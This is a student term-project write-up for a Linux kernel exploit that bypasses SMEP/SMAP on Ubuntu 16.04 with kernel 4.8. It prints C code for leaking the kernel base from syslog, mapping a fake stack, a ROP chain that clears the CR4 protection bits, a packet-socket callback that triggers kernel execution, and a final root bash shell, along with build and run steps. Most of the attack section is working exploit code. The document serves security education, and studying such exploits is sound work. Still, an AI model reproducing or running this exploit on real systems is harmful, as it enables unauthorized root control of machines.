# Computer Systems Security - Term Project
## Topic: SMEP protection bypass 

### Contributors
- Narmamatov Kadyrbek, 20152005
- Kusdavletov Ernar, 20152008


## Project goal
To write an exploit that corrupts the Linux kernel page table to bypass the protection of SMEP. 
What will it give us? Firstly, we will get the knowledge about the exploits overall and deep understanding 
about how kernel page works. Secondly, we want to see how easily it can be 
exploited and code can be implemented. Lastly, we want to measure how big 
this exploit can be dangerous and in which malicious ways it can be used. 



## Motivation behind the project goal
We are eager to learn and understand how low level, and at the same time very important,
feature of linux systems, which prevents the third party users or 
unprivileged user to control the kernel, could be exploited and given the super admin access 
over all kernel. After some research, we were surprised that even these days
we can bypass the protection of seemingly powerful and mature protection systems, such as SMEP.
Also, we are excited to start our journey to the hacking world and try to see why we still are able to find 
these kind of exploits in many systems. Thus, our overall goal is to
write the code, which will automatically manage and control the kernel page to make 
it bypass the protection of SMEP and get the privileged access to execute 
other processes. 

## Introduction
As the technology evolves and becomes powerful to make our life easier, it also becomes a complex mechanism, which gets too complicated for developers to control every aspect of that technology. Thus, fully maintaining complex technology is almost impossible and there always appear vulnerabilities or bugs, which can become an opportunity for hackers to exploit them and gain profits from them. The same thing applies to the “Kernel”, which is the fundamental system in any computer for managing the communication between hardware and software in computers (despite the fact that it is very old designed system). As Kernel was evolving, Kernel engineers tried to secure it by applying very different features and one of those approaches is securing by SMEP, which was first introduced in 2010. SMEP is described by a one-bit variable in the Kernel, which basically shows if it is enabled or disabled. Here, we will explain the simple idea behind SMEP and describe different ways it can be exploited in Linux.



## What a SMEP is ...
So, SMEP `Supervisor Mode Execution Prevention`, as the name states, helps Kernel to prevent the execution of non-privileged code or command in Kernel space. Let’s see in details, how it works.

The memory, where all processes (note: Kernel itself is also a kind of a process) are being stored and executed is divided into two spaces, first is Kernel space (which is about ~800MB in Linux x86 OS) and second is the user space, where all user-defined commands and codes are stored. It was designed in this way to isolate the Kernel for security reasons. The difference between user space and kernel space is that the Kernel space is more privileged, it is able to directly communicate with CORE and execute powerful commands. Basically, if you are able to execute commands in Kernel space, you able to get any data stored on a computer or crash the whole system. Thus, SMEP always detects and prevents the execution of the code which was defined by the regular user and then returns PAGE FAULTS. PAGE FAULTS is not really important for this post, but you can imagine that it simply tells to the OS that some error happened within the Kernel. Every OS handles the PAGE FAULTS in its own way, for example, Windows shows the blue error screen when it encounters the PAGE_FAULT, which must be very familiar to many of you. 
Before SMEP was introduced, there were many ways to exploit the Kernel with different ways, but mostly using well-known exploit called Stack Buffer Overflow. Unfortunately, there are still some tricky ways to disable the SMEP or execute the attacker’s code within the Kernel space itself.

## Prerequisite knowledge
Let's visualize how Linux memory looks like and when SMEP and other protection systems helps us to protect OS.
![alt text](https://cdn-images-1.medium.com/max/800/1*wrP0BFjfto54qOYWSJ5YQg.png "Linux Memory")

As we can see, everytime any code, which is going to be executed in Kernel space, is checked by SMEP and if the code points to user space, then it prevents from execution. But the one important thing to note, is that when the code is located within the kernel space, then there is no problem for execution of code. So our solution here, is to somehow get our code to the kernel memory space and execute it. Our solution using that loophole by executing our code ("Our code" here is the chunk of assembly which disables the SMEP) somehow inside that kernel space. Let's go the solution step-by-step.

First thing to do is to know where the whole kernel space actually is. In old systems it was always constant. But there was a protection introduced, which is called KASLR (Basically, almost same as ASLR but for Kernel space). So, we have to first bypass that protection first. To do that, we get the any freed adress by looking in kernel space logs and using that freed space for our purposes and parsing it by adding and substring some offsets. It is explained in more details later.

Now, when we know the address we should allocated some space at that address our assembly code, which is simly turns off the smep.

Then we would use the vulnerability in the packets by storing our buffer in packets and trying to send it to localhost by exploiting the known vulnerability. There is more explanation below in `Code explanation` part.


## Code structure
1.  smep.c
    - Responsible for disable smep/smap
2.  rootacces.h
    - Accesses the kernel space and executes shell via root privilege
    - Used to validate that smep/smap was disabled
2.  smep-bypass
    - Binary executable generated after the compilation
Here, we mainly focus on file smep.c, because this file consists of the core part for the exploitation of SMEP.
Below, we will explain main parts of the code. 
### Geting the Kernel space address
```c
char* buffer;
int size;
size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
size = (size / getpagesize() + 1) * getpagesize();
buffer = (char*)mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
size = klogctl(SYSLOG_ACTION_READ_ALL, &(buffer[0]), size);	
const char* needle1 = "Freeing unused";
char* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));
if (substr == NULL) {
	fprintf(stderr, "[-] Can't find Kernel base address %s\n", needle1);
	exit(EXIT_FAILURE);
}
int start = 0;
int end = 0;
for (start = 0; substr[start] != '-'; start++);
for (end = start; substr[end] != '\n'; end++);

const char* needle2 = "ffffff";
substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));
if (substr == NULL) {
	fprintf(stderr, "[-] Can't find Kernel base address %s\n", needle2);
	exit(EXIT_FAILURE);
}
printf("found: %s\n", substr);

char* endptr = &substr[16];
unsigned long r = strtoul(&substr[0], &endptr, 16);

r &= 0xfffffffffff00000ul;
r -= 0x1000000ul;
KERNEL_BASE = r;
```
The above code, tries to find the Kernel space address by first looking at the kernel syslog files and finding from freed space by looking the words `Freeing unused`. Since, the logs leave the address in those files also, we can get the address too, by parsing the whole string into one adress string, and then from that string we can convert it to the `unsigned long` via `strtoul` function. The last lines of the code, makes some computation stuff to get the parsed address by adding the offset.

### Getting the stack address for memory in Kernel
```c
uint64_t stack_aligned, stack_addr;
int page_size, stack_size, stack_offset;
uint64_t* stack;
page_size = getpagesize();
stack_aligned = ((KERNEL_BASE + xchg_eax_esp_ret_val) & 0x00000000fffffffful) & ~(page_size - 1);
stack_addr = stack_aligned - page_size * 4;
stack_size = page_size * 8;
stack_offset = (KERNEL_BASE + xchg_eax_esp_ret_val) % page_size;

stack = mmap((void*)stack_addr, stack_size, PROT_READ | PROT_WRITE,
			MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

if (stack == MAP_FAILED || stack != (void*)stack_addr) {
	perror("[-] mmap()");
	exit(EXIT_FAILURE);
}
```
Get the points and allocates the memory in kernel space address via using the function `map`. Then the stack pointer is used to embed the injection code. Note, sometimes we can overwrite some system code, so that system may disfunction in some of the tries.
		
### Generating and overwriting the memory
```c
stack = (uint64_t*)((char*)stack_aligned + stack_offset);
*stack++ = (KERNEL_BASE + pop_rdi_ret_val);			
*stack++ = (uint64_t)&saved_esp;	
*stack++ = (KERNEL_BASE + mov_dword_ptr_rdi_eax_ret_val);
*stack++ = (KERNEL_BASE + mov_rax_cr4_ret_val);			
*stack++ = (KERNEL_BASE + neg_rax_ret_val);			
*stack++ = (KERNEL_BASE + pop_rcx_ret_val);			
*stack++ = SMEP_MASK;			
*stack++ = (KERNEL_BASE + or_rax_rcx_ret_val);		
*stack++ = (KERNEL_BASE + neg_rax_ret_val);;			
*stack++ = (KERNEL_BASE + xchg_eax_edi_ret_val);		
*stack++ = (KERNEL_BASE + mov_cr4_rdi_ret_val);			
*stack++ = (KERNEL_BASE + pop_rcx_ret_val);               
*stack++ = (uint64_t)&payload;        
*stack++ = (KERNEL_BASE + jmp_rcx_val);
```
where each variable corresponds to following assembly language commands:
```assembly
xchg eax, esp ; ret
pop rdi ; ret
mov dword ptr [rdi], eax ; ret
push rbp ; mov rbp, rsp ; mov rax, cr4 ; pop rbp ; ret
neg rax ; ret
pop rcx ; ret 
or rax, rcx ; ret
xchg eax, edi ; ret
push rbp ; mov rbp, rsp ; mov cr4, rdi ; pop rbp ; ret
jmp rcx
```
which basically, turns off bits in cr4 to disable the functionality of SMEP and SMAP.
### Sending the injection code via packets
```c
void init_skb_buffer(char* buffer, unsigned long func) {
	struct skb_shared_info* ssi = (struct skb_shared_info*)buffer;
	memset(ssi, 0, sizeof(*ssi));

	ssi->tx_flags = 0xff;
	ssi->destructor_arg = (uint64_t)&ui;
	ssi->nr_frags = 0;
	ssi->frag_list = 0;

	ui.callback = func;
}
```
The function creates the appropriate data struct within the buffer and includes our function in `ui.callback` part. Afterwards:
```c
int size = SHINFO_OFFSET + sizeof(struct skb_shared_info);
int rv = send(s, buffer, size, MSG_MORE);
```
We try to send that buffer via the packets, which later is executed in the kernel space itself, thus disabling the SMEP and enabling us execute priviliged commands.
And lastly, we are able to execute the shell via:
```c
void root_access_grant() {
	char* shell = "/bin/bash";
	char* args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
}
```



## Exploit demostration
- [Video demo](https://drive.google.com/file/d/1WV4bUTRUCjse5vWoxJn0cYCSYRArM5w2/view?usp=sharing)

## Environment settings
- [Ubuntu 16.04.5 Desktop 64bit](http://releases.ubuntu.com/16.04/)
- [Linux image 4.8.0-58-generic xenial](https://drive.google.com/file/d/1le9Ww2X94J8ZCI8kS9P16vuv1pmVZtsj/view?usp=sharing)


## How to run 
```javascript
gcc -o smep-bypass smep.c rootaccess.h
./smep-bypass
```

## Work done:

- Learned how kernel page is structured
- Read a lot of related papers and articles
- Learned how SMEP/SMAP technology works
- Learned how to beat SMEP/SMAP on Linux
- Analyzed the exploitation codes for SMEP/SMAP
- Experimented by coding

## Results
At the end, we were able to disable the SMEP/SMAP and run the priviliged commands without typing any credentials as can be seen in recored video.

## Conclusion
We were excited to learn and see the Computer from deep inside. Moreover, we were suprised, that it was possible to write the code, which could easily interact with low-lever parts of the system and even with the hardwares. The main takeout from this project for us was that we became more confident in exploring the "low-level world" in programming and that anything, even the oldest and most complex system, can be broken. 
## References
- [CVE-2017-5123](https://salls.github.io/Linux-Kernel-CVE-2017-5123/)
- [Project Zero](https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html)
- [ret2dir and ret2usr tactics](https://www.youtube.com/watch?v=kot-EQ9zf9k)
- [kR^X](https://www.youtube.com/watch?v=L-3eCmZ8s3A&t=792s)
- [Positive Technologies](http://blog.ptsecurity.com/2012/09/intel-smep-overview-and-partial-bypass.html)
